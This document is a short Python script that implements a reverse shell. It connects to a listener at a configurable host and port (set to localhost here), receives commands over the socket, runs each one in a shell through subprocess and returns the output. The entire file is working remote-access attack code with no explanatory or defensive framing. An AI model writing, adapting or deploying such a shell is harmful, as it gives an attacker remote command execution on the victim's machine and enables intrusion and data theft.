import socket
import subprocess

REMOTE_HOST = '127.0.0.1'
REMOTE_PORT = 5500
client = socket.socket()
client.connect((REMOTE_HOST, REMOTE_PORT))

while True:
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    client.send(output + output_error)
